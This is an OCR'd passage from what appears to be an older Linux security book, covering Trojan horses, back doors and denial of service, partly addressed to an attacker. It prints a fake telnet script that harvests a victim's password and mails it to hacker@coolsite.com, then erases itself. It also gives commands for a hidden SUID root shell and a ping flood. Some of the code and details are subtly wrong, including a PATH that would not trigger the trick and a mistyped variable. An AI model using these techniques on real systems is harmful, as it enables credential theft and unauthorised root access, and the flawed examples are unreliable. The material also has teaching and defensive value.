- pgno: 290
  md: 'The three hackers — two high-schoolers from the San Francisco Bay Area and
    an 18-year-old Israeli who went by the name the Analyzer — used an old staid exploit
    that Sun Microsystems released a year and a half before the attacks.


    The Analyzer, after being caught, was enlisted in the Israeli army. After two
    years of service, he will have a job working for a computer company — probably
    maintaining computer security. (Not exactly a crime-doesn''t-pay story, is it?)


    Another recent attack was from MilWorm, which broke into the Indian Nuclear Facilities
    and stole classified information. These attacks exploited an old version on sendmail
    with known exploits.


    Now, if either of these governments had installed patches or upgraded, they might
    not have made the headlines in such an embarrassing way.


    # TROJAN HORSES


    Named after the ancient wooden "gift horse" that smuggled enemy soldiers into
    Troy, Trojan horses are hidden programs that obtain root access to an unknowing
    victim — take (for a great example) a student in the computer lab who leaves his
    or her account logged in, and leaves. If you''re attacking, you have access to
    the neglected account for now. You don''t have the password, but if your victim
    is a student (and you remember that telnet was the program most often used to
    get into other system accounts) you could change the PATH in your victim''s .login
    or .profile so it looks like this:


    ```

    PATH=/usr/bin:/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/X11R6/bin

    ```


    Making this change runs the command found in the first directory; if it''s not
    there, the process looks into the next one. Suppose you (clever hacker) create
    a script called telnet and place it in your victim''s home directory. Presto!
    You can get that person''s password information. After you create this file, you''d
    log out, with no one (except a really alert administrator) the wiser. A Trojan
    Telnet session script could look like this:


    ```

    #! /bin/sh

    # Trojan Telnet session


    echo "Trying $1..."

    echo "Connected to $1."

    echo "Escape character is ''^\''."

    echo ""

    echo "Linux 2.0.34."

    echo "

    ```'
  merge: -1
  img_proc: true
- pgno: 291
  md: '```

    ```bash

    echo "$login: "

    read ID

    echo "password: "

    read PW

    echo "Login incorrect."

    echo "User $ID and Password $PD" | mail hacker@coolsite.com

    rm $0

    kill -9 $PPID

    ```

    ```


    This does several crucial things: it looks like the real program (especially if
    it loops three times — this one doesn''t so we can keep the illustration simple),
    the user believes it, it mails off the username and password to the hacker, and
    the program removes itself (rm $0) and kills its own process (kill -9 $PPID).


    The example does show some sloppy workmanship: it doesn''t really act like a telnet
    session because it does not loop three times, it doesn''t encrypt the username
    and password (which makes it easy to trace), your e-mail address is right there
    on it, and the file is sitting in the user''s account where it might be deleted
    before it finishes its dirty work.


    However, it''s a great way for a hacker to get on a system without having initial
    access. Another place this script might be used is on a careless root user who
    has writable directories in its PATH. Then you can be local to the system, have
    the root account, and be able to clean up the logs yourself.


    A few years back, the wu-ftpd program had a Trojan horse in it. The Washington
    University at St. Louis (warchive.wustl.edu) site had warnings placed at all sites
    to let people know they needed to upgrade.


    ![](img/8ad518fddafc7f5e73715a2604b61d50_291_0.png)


    > Tripwire, which is available at http://www.visualcomputing.com, picks up on
    Trojan Horses easily. If you want to run a Trojan horse checker from a user account,
    one is available at ftp://coast.cs.purdue.edu/pub/tools/unix/trojan.


    # ## BACK DOORS


    Suppose you''re a notorius hacker who''s sneaked into a system via a Trojan horse
    or a program exploit, and the original hole is closed. How do you get back in?
    You can either research other exploits, or leave a *back door*— a program that
    creates a new access point into the host.


    A back door can be a user account, a process, or an open port with a program attached
    to it. For example, once you have root access on a host, you can create a script
    that will run a shell as root to give you root access. The first thing you''d
    do is make a copy of your favorite shell to a user directory (like the guest account),
    and rename it to `.backdoor`. This creates a hidden file you can use anytime.
    One such devious item might look like this:'
  merge: -1
  img_proc: true
- pgno: 292
  md: '```

    # cp /bin/bash /home/guest

    # mv /home/guest/bash /home/guest/./.backdoor

    ```


    Next you give the file SUID access and root control.


    ```

    # chmod 4755 /home/guest/./.backdoor

    # chown root /home/guest/./.backdoor

    ```


    Now you can run the .backdoor command and have root access to your heart''s content.
    Another bit of mischief you can make is to change the permissions on a device
    to writable-by-everyone. This enables you to send commands to that device — and
    they will run as root commands.


    # ## Denial of Service


    A denial-of-service attack is designed to bring down the host or network services.
    Most UNIX exploits to specific network ports can attack similar vulnerable points
    in Linux as well. One such simple attack—which can bring down a Web server— uses
    the ping command with the flood option (-f):


    ```

    # ping -f some.webserver.org 80

    ```


    ![](img/8ad518fddafc7f5e73715a2604b61d50_292_0.png)'
  merge: -1
